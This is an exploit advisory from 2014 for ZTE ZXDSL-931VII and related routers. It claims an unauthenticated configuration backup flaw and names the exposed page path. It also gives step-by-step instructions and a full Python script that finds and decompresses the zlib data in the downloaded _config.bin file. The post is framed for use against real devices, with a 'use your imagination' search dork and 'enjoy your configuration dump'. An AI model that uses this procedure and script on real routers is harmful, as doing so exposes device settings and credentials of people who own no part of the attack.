# Exploit Title: ZTE ZXDSL-931VII Unauthenticated Configuration Dump
# Google Dork: use your imagination 
# Date: 09-12-2014
# Exploit Author: L0ukanik0sGR
# Vendor Homepage: www.zte.com.cn
# Software Link: https://www.ote.gr/web/guest/help-and-support/internet/vdsl/-/support/article/870213%3Bjsessionid=01605E58A483CF54BB0E95208F531764.node3_1_OTEGR?! original firmware for that device could not be found but it works to all zte devices with custom ISP firmware :)
# Version: 931vii,w300 and all zte products running that firmware
# Tested on: linux other os compatible
# CVE : None yet it's a 0day


ZTE ZXDSL-931VII Unauthenticated Configuration Dump

Unauthenticated Configuration File Download and
Decompression of the _config.bin file 
by L0ukanik0s,GR 2014,l0ukanik0s@hotmail.com


Exploit PoC:

1. Go to http://router-ip/ manager_dev_config_t.gch

2. 
Click on 'Backup Configuration' and obtain the _config.bin

3. 
Download python script from http://pastebin.com/i6dfsL5D

4. 
Then compile and run zte-0day.py (root@l0ukanik0s:~# python zte-0day.py)

5. 
Insert the path of the _config.bin file hit 'ENTER'

6. 
Enjoy your configuration dump






#!/usr/bin/env python
import zlib
#scripte originated from http://reverseengineering.stackexchange.com/questions/3593/re-compressed-backup-file-router-linux-based-so-is-it-compresed-with-zlib
print "################################################"
print "#       THe W0lf is so close                   #"
print "# ZTE 931Vii Router configuration unpacker     #"
print "#       Find configuration file @              #"
print "#  http://192.168.1.1/manager_dev_config_t.gch #"
print "#      L0ukanik0s 2014 Hack-Hosting            #"
print "#        l0ukanik0s@hotmail.com                #"
print "################################################"
 
print "Enter your config.bin path: e.g root@l0ukanik0s:~#/Desktop/931router_config.bin"
configfile = raw_input("File Path :").strip()
 
magic_numbers = ['\x78\xDA']
filename = configfile
 
 
infile = open(filename, 'r')
data = infile.read()
 
 
pos = 0
found = False
 
 
while pos < len(data):
        window = data[pos:pos+2]
        for marker in magic_numbers:
                if window == marker:
                        found = True
                        start = pos
                        print "Start of zlib %s" % pos
                        rest_of_data = data[start:]
                        decomp_obj = zlib.decompressobj()
                        uncompressed_msg = decomp_obj.decompress(rest_of_data)                 
                        print "Configuration of ZTE 931 File Content: %s" % uncompressed_msg
                        break
        if pos == len(data):
                break
        pos += 1
 
 
if found:
        header = data[:start]
        footer = decomp_obj.unused_data
 
 
if not found:
        print "Sorry, no zlib found."